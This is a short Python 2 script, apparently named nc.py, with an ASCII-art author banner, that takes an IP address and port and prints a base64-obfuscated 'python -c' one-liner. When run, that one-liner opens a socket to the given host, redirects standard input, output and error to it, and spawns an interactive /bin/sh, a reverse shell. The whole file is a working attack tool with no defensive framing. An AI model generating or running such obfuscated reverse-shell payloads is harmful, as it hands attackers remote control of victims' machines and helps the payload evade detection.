'''
 data: 2015.2.2
 author:
 ____                            __  __                   __  __            
/\  _`\                         /\ \/\ \                 /\ \/\ \           
\ \ \/\ \    ___     ___      __\ \ \_\ \    ___   __  __\ \ \_\ \     __   
 \ \ \ \ \  / __`\ /' _ `\  /'_ `\ \  _  \  / __`\/\ \/\ \\ \  _  \  /'__`\ 
  \ \ \_\ \/\ \L\ \/\ \/\ \/\ \L\ \ \ \ \ \/\ \L\ \ \ \_\ \\ \ \ \ \/\  __/ 
   \ \____/\ \____/\ \_\ \_\ \____ \ \_\ \_\ \____/\ \____/ \ \_\ \_\ \____\
    \/___/  \/___/  \/_/\/_/\/___L\ \/_/\/_/\/___/  \/___/   \/_/\/_/\/____/
                              /\____/                                       
                              \_/__/                                        
  
'''
from base64 import encodestring
from sys import argv
try:
	print "python -c \"exec( __import__( 'base64' ).decodestring(", '\'' + encodestring("s=__import__('socket').socket(__import__('socket').AF_INET,__import__('socket').SOCK_STREAM); s.connect(('{}', {})); __import__('os').dup2(s.fileno(),0); __import__('os').dup2(s.fileno(),1); __import__('os').dup2(s.fileno(),2); p=__import__('subprocess').call(['/bin/sh','-i'])".format(argv[1], argv[2])).replace('\n', '\\n') + '\'', ") )\"" # = = i couldn't use  str1 + str2
except:
	print 'Usage: python nc.py ip port'
